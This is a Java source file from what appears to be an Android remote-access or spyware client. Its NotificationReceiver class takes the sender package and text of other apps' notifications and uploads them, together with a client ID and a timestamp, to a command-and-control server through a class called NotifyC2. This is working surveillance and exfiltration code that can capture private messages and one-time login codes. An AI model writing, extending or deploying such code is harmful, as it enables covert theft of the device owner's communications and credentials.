package com.ot.grhq.client.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.ot.grhq.client.functionality.Utils;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Notifications broadcast receiver
 */
class NotificationReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("notification_data".equals(intent.getAction())) {
            String packageName = intent.getStringExtra("package_name");
            String notificationContent = intent.getStringExtra("notification_content");

            String formData = "id=" + Utils.clientID(context);
            formData += "&type=client";
            formData += "&res=notification";
            formData += "&sender=" + packageName;
            formData += "&content=" + notificationContent;
            formData += "&timestamp=" + System.currentTimeMillis();
            new NotifyC2(Utils.C2_SERVER + "/uploadNotification", formData, result -> {

            }).execute();

        }
    }
}
